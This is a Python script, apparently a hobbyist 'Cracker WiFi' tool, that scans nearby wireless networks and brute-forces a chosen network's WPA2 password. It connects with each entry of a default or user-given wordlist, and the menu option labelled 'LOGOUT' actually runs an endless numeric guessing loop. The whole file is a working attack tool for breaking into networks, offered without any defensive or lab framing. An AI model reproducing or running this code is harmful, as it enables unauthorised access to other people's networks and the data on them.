from turtle import color
from pywifi import const, PyWiFi ,Profile
from time import sleep
import os
from colorama import Fore as color

os.system("cls")
print(color.RED+"""
                     _             
                    | |            
  ___ _ __ __ _  ___| | _____ _ __ 
 / __| '__/ _` |/ __| |/ / _ \ '__|
| (__| | | (_| | (__|   <  __/ |   
 \___|_|  \__,_|\___|_|\_\___|_|   """)
sleep(0.1)
print(color.RED+"""

Developer HUGOW04

""")
sleep(0.1)
print(color.LIGHTBLACK_EX+"1. Cracker WiFi With PassWord List Defualt")
sleep(0.1)
print('')
print(color.LIGHTBLACK_EX+"2. Cracker WiFi With Your PassWord List")
sleep(0.1)
print("")
print("3. LOGOUT")
sleep(0.1)
print("")

userInput = input("Enter answer: ")
sleep(0.1)
print("")

if userInput == "1":
    print(color.LIGHTBLUE_EX+"<< Hello WelCome To Cracker WiFi >>")

    def scan(): # For Scan the area
        interface.scan()
        sleep(8)
        result = interface.scan_results()
        return result

    def testwifi(ssid , password):
        interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        interface.connect(interface.add_network_profile(profile))
        sleep(1)
        if interface.status() == const.IFACE_CONNECTED:
            interface.remove_network_profile(profile)
            return True
        else:
            interface.remove_network_profile(profile)
            return False
            

    
    wifi = PyWiFi() # Wifi Object
    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
    print("")
    print("Test PassWord List Default")
    sleep(0.1)
    print("")
    passlist = "passwordlist.txt"  # Password List File 

    print(color.GREEN+"<<Scanning ... ")
    APs = scan()

    for i in range(len(APs)):
        print("{} - {}".format(i+1 ,APs[i].ssid))

    index = int(input("\n>> "))
    target = APs[index-1]

    for password in open(passlist):
        password = password.strip("\n")
        print(color.RED+"Testing : {}".format(password))
        if testwifi(target.ssid , password): 
            print("-" *30)
            print(color.GREEN+"PASSWORD : {}".format(password))
            print("-" *30)
            break

    input()  

elif userInput == "2":
    print(color.LIGHTBLUE_EX+"<< Hello WelCome To Cracker WiFi >>")
    sleep(0.1)
    print("")
    sleep(0.1)
    def scan(): # For Scan the area
        interface.scan()
        sleep(8)
        result = interface.scan_results()
        return result

    def testwifi(ssid , password):
        interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        interface.connect(interface.add_network_profile(profile))
        sleep(1)
        if interface.status() == const.IFACE_CONNECTED:
            interface.remove_network_profile(profile)
            return True
        else:
            interface.remove_network_profile(profile)
            return False
            
    
    wifi = PyWiFi() # Wifi Object
    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
    print(color.LIGHTMAGENTA_EX+"< Enter The List Password Name To Crack PassWord >")
    sleep(0.1)
    print("")
    
    print(color.LIGHTMAGENTA_EX+"<<< Please Enter The List Password File In The Tool Path And Enter Its Name >>>")
    print("")
    sleep(0.1)
    passlist = input(color.LIGHTMAGENTA_EX+"<<Enter The PassWord List To Crack WiFi : ")

    print(color.GREEN+"<<Scanning ... ")
    APs = scan()

    for i in range(len(APs)):
        print("{} - {}".format(i+1 ,APs[i].ssid))

    index = int(input("\n>> "))
    target = APs[index-1]

    for password in open(passlist):
        password = password.strip("\n")
        print(color.RED+"Testing : {}".format(password))
        if testwifi(target.ssid , password):
            print("-" *30)
            print(color.GREEN+"PASSWORD : {}".format(password))
            print("-" *30)
            break
elif userInput == "3":
    print(color.LIGHTBLUE_EX+"<< Hello WelCome To Cracker WiFi >>")

    def scan(): # For Scan the area
        interface.scan()
        sleep(8)
        result = interface.scan_results()
        return result

    def testwifi(ssid , password):
        interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        interface.connect(interface.add_network_profile(profile))
        sleep(1)
        if interface.status() == const.IFACE_CONNECTED:
            interface.remove_network_profile(profile)
            return True
        else:
            interface.remove_network_profile(profile)
            return False
            

    
    wifi = PyWiFi() # Wifi Object
    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
    print("")
    print("Test PassWord List Default")
    sleep(0.1)
    print("")
    passlist = "passwordlist.txt"  # Password List File 

    print(color.GREEN+"<<Scanning ... ")
    APs = scan()

    for i in range(len(APs)):
        print("{} - {}".format(i+1 ,APs[i].ssid))

    index = int(input("\n>> "))
    target = APs[index-1]

    password = 0
    while True:
        password += 1
        print(color.RED+"Testing: {}".format(password))
        if testwifi(target.ssid,password):
            print("-" *30)
            print(color.GREEN+"PASSWORD : {}".format(password))
            print("-" *30)
            break




else:
    print("cya")
